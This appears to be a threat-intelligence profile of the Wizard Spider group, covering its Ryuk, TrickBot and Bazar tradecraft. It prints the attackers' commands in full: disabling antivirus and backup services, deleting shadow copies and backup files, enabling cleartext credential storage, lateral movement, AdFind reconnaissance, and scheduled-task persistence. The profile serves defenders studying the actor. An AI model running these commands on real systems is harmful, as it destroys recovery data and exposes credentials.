# Wizard Spider

## Features

1. Ryuk ransomware will modify the registry to maintain persistence HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run the value of is Ryuk executable path.

The ransomware will stop or disable the service by creating a kill.bat batch script, and then terminate some specific processes.

```bash
net stop avpsus /y  //Stop Kaspersky Update Service
net stop McAfeeDLPAgentService /y  //Stop McAfee DLP Agent Service
net stop mfewc /y  //Stop McAfee Web Control Service
net stop BMR Boot Service /y  //Stop BMR service
net stop NetBackup BMR MTFTP Service /y  //Stop NetBackup BMR boot service
sc config SQLTELEMETRY start= disabled  //Disable the Telemetry service for SQL Server
sc config SQLTELEMETRY$ECWDB2 start= disabled
sc config SQLWriter start= disabled  //Disable Volume Shadow Copy Service for SQL Server
sc config SstpSvc start= disabled  //Disable SSTP support service
taskkill /IM mspub.exe /F  //Terminate Microsoft Office processes
taskkill /IM mydesktopqos.exe /F
//Terminate the process of recording keyboard and mouse input and connecting to the network
taskkill /IM mydesktopservice.exe /F  //Terminate Oracle MyDesktop process
```

Then the ransomware will use the windows.bat batch script to make it more difficult for the infected host to recover the source file.

```bash
vssadmin Delete Shadows /all /quiet
//Delete shadow copies of all specified volumes and do not display messages at run time
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
//Specify the C volume to adjust the maximum storage space, then specify the storage volume as C, and finally specify the maximum space for storage shadow copies as 401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
//Adjust the maximum amount of space for the shadow copy of volume C on volume C
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
//Delete files according to their location and extension. q is quiet mode; s refers to all subdirectory files; f To turn off the function of user confirmation and forced deletion of files
del %0  //Delete the executing .bat script
```

2. The delivered TrickBot malware will modify the registry HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest the UseLogonCredential value is 1.Set the UseLogonCredential value to "1" to configure the Windows operating system to store credentials in clear text in memory, and then retrieve credentials by using the credential dump tool.

3. Loading Ryuk ransomware through Bazar will attempt to transverse execute malicious DLL files through WMI:wmic /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW".Also try to use when transverse:powershell -nop -exec bypass -EncodedCommand [Base64 string]，Download executable files and disable Windows Defender.

The malware then collects Active Directory information by downloading the adfind.exe application.

```bash
AdFind.exe -f "(objectcategory=computer)"  
AdFind.exe -f "(objectcategory=group)"  
AdFind.exe -f "(objectcategory=organizationalUnit)"  
AdFind.exe -f "(objectcategory=person)"  
AdFind.exe  -subnets -f "(objectCategory=subnet)"  
AdFind.exe  -sc trustdmp  
AdFind.exe -gcb -sc trustdmp
//Dump all trust objects
```

Variants of this malware also create scheduled tasks to maintain persistence.

```bash
"C:\Windows\System32\schtasks.exe" /CREATE /SC ONSTART /TN jf0c /TR "'C:\Users\pagefilerpqy.exe'" /f
"C:\Windows\System32\schtasks.exe" /CREATE /SC ONSTART /TN jf0c /TR "'C:\Users\pagefilerpqy.exe'" /f /RL HIGHEST
"C:\Windows\System32\schtasks.exe" /CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6 /TR "'C:\Users\pagefilerpqy.exe'" /f
"C:\Windows\System32\schtasks.exe" /CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6 /TR "'C:\Users\pagefilerpqy.exe'" /f /RL HIGHEST
//Set the running key to 9T6ukfi6
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V \"microsoft update\" /t REG_SZ /F /D "SCHTASKS /run /tn 9T6ukfi6"
```
